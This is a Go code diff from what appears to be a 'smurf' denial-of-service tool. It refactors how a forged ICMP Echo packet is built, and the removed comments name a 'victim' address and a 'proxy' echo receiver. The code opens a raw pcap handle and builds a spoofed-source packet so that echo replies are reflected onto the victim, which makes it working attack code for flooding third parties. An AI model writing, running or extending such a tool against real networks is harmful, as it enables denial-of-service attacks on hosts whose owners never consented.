@@ -3,32 +3,31 @@ package main
 import (
 	"net"
 
+	"github.com/adrianosela/smurf/payloads"
 	"github.com/google/gopacket/pcap"
 	"github.com/pkg/errors"
 )
-
-type config struct {
-	victim     net.IP           // ip address of the victim
-	proxy      net.IP           // ip address of the ICMP Echo receiver
-	iface      string           // outbound network interface name to use
-	gatewayMAC net.HardwareAddr // MAC address of LAN's gateway router
-}
 
 type smurf struct {
 	wire    *pcap.Handle
 	payload []byte
 }
 
-func newSmurf(c config) (*smurf, error) {
-	wire, err := pcap.OpenLive(c.iface, 1024, false, pcap.BlockForever)
+func newSmurf(sIP, dIP net.IP, iface string, gwMAC net.HardwareAddr) (*smurf, error) {
+	wire, err := pcap.OpenLive(iface, 1024, false, pcap.BlockForever)
 	if err != nil {
-		return nil, errors.Wrap(err, "could not acquire pcap handle to wire")
+		return nil, errors.Wrap(err, "could not open live")
 	}
-	localMAC, err := ifaceMAC(c.iface)
+	nif, err := net.InterfaceByName(iface)
 	if err != nil {
-		return nil, errors.Wrap(err, "could not get outbound interface MAC")
+		return nil, errors.Wrap(err, "could not get outbound interface")
 	}
-	payload, err := spoofedICMP(c.victim, c.proxy, localMAC, c.gatewayMAC)
+	payload, err := payloads.Build(payloads.TypeICMPEcho, payloads.Config{
+		SrcIP:  sIP,
+		DstIP:  dIP,
+		SrcMAC: nif.HardwareAddr,
+		DstMAC: gwMAC,
+	})
 	if err != nil {
 		return nil, errors.Wrap(err, "could not build a spoofed payload")
 	}
